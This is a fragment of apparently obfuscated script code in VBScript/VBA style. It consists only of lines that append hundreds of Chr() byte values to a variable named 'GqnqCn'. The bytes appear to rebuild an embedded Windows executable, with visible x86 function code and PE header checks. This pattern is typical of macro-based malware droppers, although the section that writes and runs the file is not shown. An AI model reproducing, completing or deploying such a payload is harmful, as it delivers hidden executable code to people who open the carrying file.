GqnqCn=GqnqCn&Chr(205)&Chr(64)&Chr(162)&Chr(64)&Chr(0)&Chr(116)&Chr(19)&Chr(65)&Chr(131)&Chr(249)&Chr(45)&Chr(114)&Chr(241)&Chr(141)&Chr(72)&Chr(237)&Chr(131)&Chr(249)&Chr(17)&Chr(119)&Chr(14)&Chr(106)&Chr(13)&Chr(88)&Chr(93)&Chr(195)&Chr(139)&Chr(4)&Chr(205)&Chr(68)&Chr(162)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(5)&Chr(68)&Chr(255)&Chr(255)&Chr(255)&Chr(106)&Chr(14)&Chr(89)&Chr(59)&Chr(200)&Chr(27)&Chr(192)&Chr(35)&Chr(193)&Chr(131)&Chr(192)&Chr(8)&Chr(93)&Chr(195)&Chr(232)&Chr(89)&Chr(246)&Chr(255)&Chr(255)&Chr(133)&Chr(192)&Chr(117)&Chr(6)&Chr(184)&Chr(168)&Chr(163)&Chr(64)&Chr(0)&Chr(195)&Chr(131)&Chr(192)&Chr(8)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(83)&Chr(86)&Chr(87)&Chr(255)&Chr(53)&Chr(232)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(100)&Chr(244)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(228)&Chr(183)&Chr(64)&Chr(0)&Chr(139)
GqnqCn=GqnqCn&Chr(248)&Chr(137)&Chr(125)&Chr(252)&Chr(232)&Chr(84)&Chr(244)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(89)&Chr(89)&Chr(59)&Chr(247)&Chr(15)&Chr(130)&Chr(131)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(222)&Chr(43)&Chr(223)&Chr(141)&Chr(67)&Chr(4)&Chr(131)&Chr(248)&Chr(4)&Chr(114)&Chr(119)&Chr(87)&Chr(232)&Chr(187)&Chr(38)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(141)&Chr(67)&Chr(4)&Chr(89)&Chr(59)&Chr(248)&Chr(115)&Chr(72)&Chr(184)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(59)&Chr(248)&Chr(115)&Chr(2)&Chr(139)&Chr(199)&Chr(3)&Chr(199)&Chr(59)&Chr(199)&Chr(114)&Chr(15)&Chr(80)&Chr(255)&Chr(117)&Chr(252)&Chr(232)&Chr(239)&Chr(17)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(22)&Chr(141)&Chr(71)&Chr(16)&Chr(59)&Chr(199)&Chr(114)&Chr(64)&Chr(80)&Chr(255)&Chr(117)&Chr(252)&Chr(232)&Chr(217)&Chr(17)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)
GqnqCn=GqnqCn&Chr(192)&Chr(116)&Chr(49)&Chr(193)&Chr(251)&Chr(2)&Chr(80)&Chr(141)&Chr(52)&Chr(152)&Chr(232)&Chr(111)&Chr(243)&Chr(255)&Chr(255)&Chr(89)&Chr(163)&Chr(232)&Chr(183)&Chr(64)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(97)&Chr(243)&Chr(255)&Chr(255)&Chr(137)&Chr(6)&Chr(131)&Chr(198)&Chr(4)&Chr(86)&Chr(232)&Chr(86)&Chr(243)&Chr(255)&Chr(255)&Chr(89)&Chr(163)&Chr(228)&Chr(183)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(89)&Chr(235)&Chr(2)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(106)&Chr(4)&Chr(106)&Chr(32)&Chr(232)&Chr(67)&Chr(17)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(86)&Chr(232)&Chr(47)&Chr(243)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(163)&Chr(232)&Chr(183)&Chr(64)&Chr(0)&Chr(163)&Chr(228)&Chr(183)&Chr(64)&Chr(0)&Chr(133)&Chr(246)&Chr(117)&Chr(5)&Chr(106)&Chr(24)&Chr(88)&Chr(94)
GqnqCn=GqnqCn&Chr(195)&Chr(131)&Chr(38)&Chr(0)&Chr(51)&Chr(192)&Chr(94)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(200)&Chr(147)&Chr(64)&Chr(0)&Chr(232)&Chr(212)&Chr(248)&Chr(255)&Chr(255)&Chr(232)&Chr(183)&Chr(229)&Chr(255)&Chr(255)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(248)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(228)&Chr(232)&Chr(240)&Chr(248)&Chr(255)&Chr(255)&Chr(195)&Chr(232)&Chr(150)&Chr(229)&Chr(255)&Chr(255)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(183)&Chr(255)&Chr(255)&Chr(255)&Chr(247)&Chr(216)&Chr(27)&Chr(192)&Chr(247)&Chr(216)&Chr(89)&Chr(72)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(51)&Chr(255)&Chr(141)&Chr(183)&Chr(176)
GqnqCn=GqnqCn&Chr(163)&Chr(64)&Chr(0)&Chr(255)&Chr(54)&Chr(232)&Chr(172)&Chr(242)&Chr(255)&Chr(255)&Chr(131)&Chr(199)&Chr(4)&Chr(89)&Chr(137)&Chr(6)&Chr(131)&Chr(255)&Chr(40)&Chr(114)&Chr(232)&Chr(95)&Chr(94)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(77)&Chr(8)&Chr(184)&Chr(77)&Chr(90)&Chr(0)&Chr(0)&Chr(102)&Chr(57)&Chr(1)&Chr(116)&Chr(4)&Chr(51)&Chr(192)&Chr(93)&Chr(195)&Chr(139)&Chr(65)&Chr(60)&Chr(3)&Chr(193)&Chr(129)&Chr(56)&Chr(80)&Chr(69)&Chr(0)&Chr(0)&Chr(117)&Chr(239)&Chr(51)&Chr(210)&Chr(185)&Chr(11)&Chr(1)&Chr(0)&Chr(0)&Chr(102)&Chr(57)&Chr(72)&Chr(24)&Chr(15)&Chr(148)&Chr(194)&Chr(139)&Chr(194)&Chr(93)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)
GqnqCn=GqnqCn&Chr(139)&Chr(72)&Chr(60)&Chr(3)&Chr(200)&Chr(15)&Chr(183)&Chr(65)&Chr(20)&Chr(83)&Chr(86)&Chr(15)&Chr(183)&Chr(113)&Chr(6)&Chr(51)&Chr(210)&Chr(87)&Chr(141)&Chr(68)&Chr(8)&Chr(24)&Chr(133)&Chr(246)&Chr(118)&Chr(27)&Chr(139)&Chr(125)&Chr(12)&Chr(139)&Chr(72)&Chr(12)&Chr(59)&Chr(249)&Chr(114)&Chr(9)&Chr(139)&Chr(88)&Chr(8)&Chr(3)&Chr(217)&Chr(59)&Chr(251)&Chr(114)&Chr(10)&Chr(66)&Chr(131)&Chr(192)&Chr(40)&Chr(59)&Chr(214)&Chr(114)&Chr(232)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(106)&Chr(254)&Chr(104)&Chr(232)&Chr(147)&Chr(64)&Chr(0)&Chr(104)&Chr(32)&Chr(38)&Chr(64)&Chr(0)&Chr(100)&Chr(161)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(131)&Chr(236)&Chr(8)&Chr(83)
GqnqCn=GqnqCn&Chr(86)&Chr(87)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(49)&Chr(69)&Chr(248)&Chr(51)&Chr(197)&Chr(80)&Chr(141)&Chr(69)&Chr(240)&Chr(100)&Chr(163)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(137)&Chr(101)&Chr(232)&Chr(199)&Chr(69)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(104)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(232)&Chr(42)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(4)&Chr(133)&Chr(192)&Chr(116)&Chr(85)&Chr(139)&Chr(69)&Chr(8)&Chr(45)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(80)&Chr(104)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(232)&Chr(80)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(8)&Chr(133)&Chr(192)&Chr(116)&Chr(59)&Chr(139)&Chr(64)&Chr(36)&Chr(193)&Chr(232)&Chr(31)&Chr(247)&Chr(208)&Chr(131)&Chr(224)&Chr(1)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(77)&Chr(240)&Chr(100)&Chr(137)&Chr(13)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(139)&Chr(69)&Chr(236)&Chr(139)&Chr(8)&Chr(139)&Chr(1)&Chr(51)&Chr(210)&Chr(61)&Chr(5)&Chr(0)&Chr(0)&Chr(192)&Chr(15)&Chr(148)&Chr(194)&Chr(139)&Chr(194)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(51)&Chr(192)&Chr(139)&Chr(77)&Chr(240)&Chr(100)&Chr(137)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(52)&Chr(178)&Chr(64)&Chr(0)&Chr(163)&Chr(56)&Chr(178)&Chr(64)&Chr(0)&Chr(163)&Chr(60)&Chr(178)&Chr(64)&Chr(0)&Chr(163)&Chr(64)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(139)
GqnqCn=GqnqCn&Chr(13)&Chr(204)&Chr(160)&Chr(64)&Chr(0)&Chr(86)&Chr(57)&Chr(80)&Chr(4)&Chr(116)&Chr(15)&Chr(139)&Chr(241)&Chr(107)&Chr(246)&Chr(12)&Chr(3)&Chr(117)&Chr(8)&Chr(131)&Chr(192)&Chr(12)&Chr(59)&Chr(198)&Chr(114)&Chr(236)&Chr(107)&Chr(201)&Chr(12)&Chr(3)&Chr(77)&Chr(8)&Chr(94)&Chr(59)&Chr(193)&Chr(115)&Chr(5)&Chr(57)&Chr(80)&Chr(4)&Chr(116)&Chr(2)&Chr(51)&Chr(192)&Chr(93)&Chr(195)&Chr(255)&Chr(53)&Chr(60)&Chr(178)&Chr(64)&Chr(0)&Chr(232)&Chr(104)&Chr(241)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(106)&Chr(32)&Chr(104)&Chr(8)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(173)&Chr(246)&Chr(255)&Chr(255)&Chr(51)&Chr(255)&Chr(137)&Chr(125)&Chr(228)&Chr(137)&Chr(125)&Chr(216)&Chr(139)&Chr(93)&Chr(8)&Chr(131)&Chr(251)&Chr(11)&Chr(127)&Chr(76)&Chr(116)&Chr(21)&Chr(139)&Chr(195)&Chr(106)&Chr(2)&Chr(89)&Chr(43)&Chr(193)&Chr(116)&Chr(34)&Chr(43)&Chr(193)
GqnqCn=GqnqCn&Chr(116)&Chr(8)&Chr(43)&Chr(193)&Chr(116)&Chr(100)&Chr(43)&Chr(193)&Chr(117)&Chr(68)&Chr(232)&Chr(1)&Chr(243)&Chr(255)&Chr(255)&Chr(139)&Chr(248)&Chr(137)&Chr(125)&Chr(216)&Chr(133)&Chr(255)&Chr(117)&Chr(20)&Chr(131)&Chr(200)&Chr(255)&Chr(233)&Chr(97)&Chr(1)&Chr(0)&Chr(0)&Chr(190)&Chr(52)&Chr(178)&Chr(64)&Chr(0)&Chr(161)&Chr(52)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(96)&Chr(255)&Chr(119)&Chr(92)&Chr(139)&Chr(211)&Chr(232)&Chr(93)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(131)&Chr(198)&Chr(8)&Chr(139)&Chr(6)&Chr(235)&Chr(90)&Chr(139)&Chr(195)&Chr(131)&Chr(232)&Chr(15)&Chr(116)&Chr(60)&Chr(131)&Chr(232)&Chr(6)&Chr(116)&Chr(43)&Chr(72)&Chr(116)&Chr(28)&Chr(232)&Chr(95)&Chr(252)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(232)&Chr(229)&Chr(251)&Chr(255)
GqnqCn=GqnqCn&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(235)&Chr(174)&Chr(190)&Chr(60)&Chr(178)&Chr(64)&Chr(0)&Chr(161)&Chr(60)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(22)&Chr(190)&Chr(56)&Chr(178)&Chr(64)&Chr(0)&Chr(161)&Chr(56)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(10)&Chr(190)&Chr(64)&Chr(178)&Chr(64)&Chr(0)&Chr(161)&Chr(64)&Chr(178)&Chr(64)&Chr(0)&Chr(199)&Chr(69)&Chr(228)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(232)&Chr(164)&Chr(240)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(224)&Chr(89)&Chr(51)&Chr(192)&Chr(131)&Chr(125)&Chr(224)&Chr(1)&Chr(15)&Chr(132)&Chr(216)&Chr(0)&Chr(0)&Chr(0)&Chr(57)&Chr(69)&Chr(224)&Chr(117)&Chr(7)&Chr(106)&Chr(3)&Chr(232)&Chr(221)&Chr(228)&Chr(255)&Chr(255)&Chr(57)&Chr(69)&Chr(228)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(32)&Chr(250)&Chr(255)&Chr(255)&Chr(89)&Chr(51)&Chr(192)&Chr(137)&Chr(69)&Chr(252)&Chr(131)&Chr(251)
GqnqCn=GqnqCn&Chr(8)&Chr(116)&Chr(10)&Chr(131)&Chr(251)&Chr(11)&Chr(116)&Chr(5)&Chr(131)&Chr(251)&Chr(4)&Chr(117)&Chr(27)&Chr(139)&Chr(79)&Chr(96)&Chr(137)&Chr(77)&Chr(212)&Chr(137)&Chr(71)&Chr(96)&Chr(131)&Chr(251)&Chr(8)&Chr(117)&Chr(64)&Chr(139)&Chr(79)&Chr(100)&Chr(137)&Chr(77)&Chr(208)&Chr(199)&Chr(71)&Chr(100)&Chr(140)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(251)&Chr(8)&Chr(117)&Chr(46)&Chr(139)&Chr(13)&Chr(192)&Chr(160)&Chr(64)&Chr(0)&Chr(137)&Chr(77)&Chr(220)&Chr(139)&Chr(13)&Chr(196)&Chr(160)&Chr(64)&Chr(0)&Chr(139)&Chr(21)&Chr(192)&Chr(160)&Chr(64)&Chr(0)&Chr(3)&Chr(202)&Chr(57)&Chr(77)&Chr(220)&Chr(125)&Chr(25)&Chr(139)&Chr(77)&Chr(220)&Chr(107)&Chr(201)&Chr(12)&Chr(139)&Chr(87)&Chr(92)&Chr(137)&Chr(68)&Chr(17)&Chr(8)&Chr(255)&Chr(69)&Chr(220)&Chr(235)&Chr(219)&Chr(232)&Chr(12)&Chr(240)&Chr(255)&Chr(255)&Chr(137)&Chr(6)&Chr(199)&Chr(69)
GqnqCn=GqnqCn&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(21)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(251)&Chr(8)&Chr(117)&Chr(31)&Chr(255)&Chr(119)&Chr(100)&Chr(83)&Chr(255)&Chr(85)&Chr(224)&Chr(89)&Chr(235)&Chr(25)&Chr(139)&Chr(93)&Chr(8)&Chr(139)&Chr(125)&Chr(216)&Chr(131)&Chr(125)&Chr(228)&Chr(0)&Chr(116)&Chr(8)&Chr(106)&Chr(0)&Chr(232)&Chr(174)&Chr(248)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(83)&Chr(255)&Chr(85)&Chr(224)&Chr(89)&Chr(131)&Chr(251)&Chr(8)&Chr(116)&Chr(10)&Chr(131)&Chr(251)&Chr(11)&Chr(116)&Chr(5)&Chr(131)&Chr(251)&Chr(4)&Chr(117)&Chr(17)&Chr(139)&Chr(69)&Chr(212)&Chr(137)&Chr(71)&Chr(96)&Chr(131)&Chr(251)&Chr(8)&Chr(117)&Chr(6)&Chr(139)&Chr(69)&Chr(208)&Chr(137)&Chr(71)&Chr(100)&Chr(51)&Chr(192)&Chr(232)&Chr(79)&Chr(245)&Chr(255)&Chr(255)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)
GqnqCn=GqnqCn&Chr(72)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(84)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(88)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(106)&Chr(16)&Chr(104)&Chr(40)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(208)&Chr(244)&Chr(255)&Chr(255)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(164)&Chr(128)&Chr(64)&Chr(0)&Chr(137)&Chr(69)&Chr(228)&Chr(235)&Chr(47)&Chr(139)&Chr(69)&Chr(236)&Chr(139)&Chr(0)&Chr(139)&Chr(0)&Chr(137)&Chr(69)&Chr(224)&Chr(51)&Chr(201)&Chr(61)&Chr(23)&Chr(0)&Chr(0)&Chr(192)&Chr(15)&Chr(148)&Chr(193)&Chr(139)&Chr(193)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(129)&Chr(125)&Chr(224)&Chr(23)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(192)&Chr(117)&Chr(8)&Chr(106)&Chr(8)&Chr(255)&Chr(21)&Chr(96)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(101)&Chr(228)&Chr(0)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(228)&Chr(232)&Chr(194)&Chr(244)&Chr(255)&Chr(255)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(92)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(255)&Chr(53)&Chr(92)&Chr(178)&Chr(64)&Chr(0)&Chr(232)&Chr(10)&Chr(239)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(15)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(208)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(5)&Chr(51)&Chr(192)&Chr(64)&Chr(93)&Chr(195)&Chr(51)&Chr(192)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(20)&Chr(83)&Chr(86)&Chr(87)&Chr(232)&Chr(217)
GqnqCn=GqnqCn&Chr(238)&Chr(255)&Chr(255)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(131)&Chr(61)&Chr(96)&Chr(178)&Chr(64)&Chr(0)&Chr(0)&Chr(139)&Chr(216)&Chr(15)&Chr(133)&Chr(142)&Chr(0)&Chr(0)&Chr(0)&Chr(104)&Chr(80)&Chr(136)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(160)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(133)&Chr(255)&Chr(15)&Chr(132)&Chr(42)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(104)&Chr(68)&Chr(136)&Chr(64)&Chr(0)&Chr(87)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(20)&Chr(1)&Chr(0)&Chr(0)&Chr(80)&Chr(232)&Chr(35)&Chr(238)&Chr(255)&Chr(255)&Chr(199)&Chr(4)&Chr(36)&Chr(52)&Chr(136)&Chr(64)&Chr(0)&Chr(87)&Chr(163)&Chr(96)&Chr(178)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(80)&Chr(232)&Chr(14)&Chr(238)&Chr(255)&Chr(255)&Chr(199)&Chr(4)&Chr(36)&Chr(32)&Chr(136)&Chr(64)&Chr(0)&Chr(87)
GqnqCn=GqnqCn&Chr(163)&Chr(100)&Chr(178)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(80)&Chr(232)&Chr(249)&Chr(237)&Chr(255)&Chr(255)&Chr(199)&Chr(4)&Chr(36)&Chr(4)&Chr(136)&Chr(64)&Chr(0)&Chr(87)&Chr(163)&Chr(104)&Chr(178)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(80)&Chr(232)&Chr(228)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(163)&Chr(112)&Chr(178)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(20)&Chr(104)&Chr(236)&Chr(135)&Chr(64)&Chr(0)&Chr(87)&Chr(255)&Chr(214)&Chr(80)&Chr(232)&Chr(204)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(163)&Chr(108)&Chr(178)&Chr(64)&Chr(0)&Chr(161)&Chr(108)&Chr(178)&Chr(64)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(79)&Chr(57)&Chr(29)&Chr(112)&Chr(178)&Chr(64)&Chr(0)&Chr(116)&Chr(71)&Chr(80)&Chr(232)&Chr(42)&Chr(238)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(112)&Chr(178)&Chr(64)&Chr(0)&Chr(139)&Chr(240)&Chr(232)&Chr(29)&Chr(238)&Chr(255)&Chr(255)
GqnqCn=GqnqCn&Chr(89)&Chr(89)&Chr(139)&Chr(248)&Chr(133)&Chr(246)&Chr(116)&Chr(44)&Chr(133)&Chr(255)&Chr(116)&Chr(40)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(116)&Chr(25)&Chr(141)&Chr(77)&Chr(248)&Chr(81)&Chr(106)&Chr(12)&Chr(141)&Chr(77)&Chr(236)&Chr(81)&Chr(106)&Chr(1)&Chr(80)&Chr(255)&Chr(215)&Chr(133)&Chr(192)&Chr(116)&Chr(6)&Chr(246)&Chr(69)&Chr(244)&Chr(1)&Chr(117)&Chr(9)&Chr(129)&Chr(77)&Chr(16)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(235)&Chr(57)&Chr(161)&Chr(100)&Chr(178)&Chr(64)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(48)&Chr(80)&Chr(232)&Chr(218)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(37)&Chr(255)&Chr(208)&Chr(137)&Chr(69)&Chr(252)&Chr(133)&Chr(192)&Chr(116)&Chr(28)&Chr(161)&Chr(104)&Chr(178)&Chr(64)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(19)&Chr(80)&Chr(232)&Chr(189)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)
GqnqCn=GqnqCn&Chr(8)&Chr(255)&Chr(117)&Chr(252)&Chr(255)&Chr(208)&Chr(137)&Chr(69)&Chr(252)&Chr(255)&Chr(53)&Chr(96)&Chr(178)&Chr(64)&Chr(0)&Chr(232)&Chr(165)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(16)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(117)&Chr(252)&Chr(255)&Chr(208)&Chr(235)&Chr(2)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(83)&Chr(51)&Chr(219)&Chr(86)&Chr(87)&Chr(59)&Chr(195)&Chr(116)&Chr(7)&Chr(139)&Chr(125)&Chr(12)&Chr(59)&Chr(251)&Chr(119)&Chr(27)&Chr(232)&Chr(225)&Chr(248)&Chr(255)&Chr(255)&Chr(106)&Chr(22)&Chr(94)&Chr(137)&Chr(48)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(232)&Chr(106)&Chr(248)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(139)&Chr(198)&Chr(235)&Chr(60)&Chr(139)
GqnqCn=GqnqCn&Chr(117)&Chr(16)&Chr(59)&Chr(243)&Chr(117)&Chr(4)&Chr(136)&Chr(24)&Chr(235)&Chr(218)&Chr(139)&Chr(208)&Chr(56)&Chr(26)&Chr(116)&Chr(4)&Chr(66)&Chr(79)&Chr(117)&Chr(248)&Chr(59)&Chr(251)&Chr(116)&Chr(238)&Chr(138)&Chr(14)&Chr(136)&Chr(10)&Chr(66)&Chr(70)&Chr(58)&Chr(203)&Chr(116)&Chr(3)&Chr(79)&Chr(117)&Chr(243)&Chr(59)&Chr(251)&Chr(117)&Chr(16)&Chr(136)&Chr(24)&Chr(232)&Chr(154)&Chr(248)&Chr(255)&Chr(255)&Chr(106)&Chr(34)&Chr(89)&Chr(137)&Chr(8)&Chr(139)&Chr(241)&Chr(235)&Chr(181)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(83)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(51)&Chr(219)&Chr(87)&Chr(57)&Chr(93)&Chr(20)&Chr(117)&Chr(16)&Chr(59)&Chr(243)&Chr(117)&Chr(16)&Chr(57)&Chr(93)&Chr(12)&Chr(117)&Chr(18)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(59)&Chr(243)
GqnqCn=GqnqCn&Chr(116)&Chr(7)&Chr(139)&Chr(125)&Chr(12)&Chr(59)&Chr(251)&Chr(119)&Chr(27)&Chr(232)&Chr(88)&Chr(248)&Chr(255)&Chr(255)&Chr(106)&Chr(22)&Chr(94)&Chr(137)&Chr(48)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(232)&Chr(225)&Chr(247)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(139)&Chr(198)&Chr(235)&Chr(213)&Chr(57)&Chr(93)&Chr(20)&Chr(117)&Chr(4)&Chr(136)&Chr(30)&Chr(235)&Chr(202)&Chr(139)&Chr(85)&Chr(16)&Chr(59)&Chr(211)&Chr(117)&Chr(4)&Chr(136)&Chr(30)&Chr(235)&Chr(209)&Chr(131)&Chr(125)&Chr(20)&Chr(255)&Chr(139)&Chr(198)&Chr(117)&Chr(15)&Chr(138)&Chr(10)&Chr(136)&Chr(8)&Chr(64)&Chr(66)&Chr(58)&Chr(203)&Chr(116)&Chr(30)&Chr(79)&Chr(117)&Chr(243)&Chr(235)&Chr(25)&Chr(138)&Chr(10)&Chr(136)&Chr(8)&Chr(64)&Chr(66)&Chr(58)&Chr(203)&Chr(116)&Chr(8)&Chr(79)&Chr(116)&Chr(5)&Chr(255)&Chr(77)&Chr(20)&Chr(117)&Chr(238)&Chr(57)&Chr(93)&Chr(20)
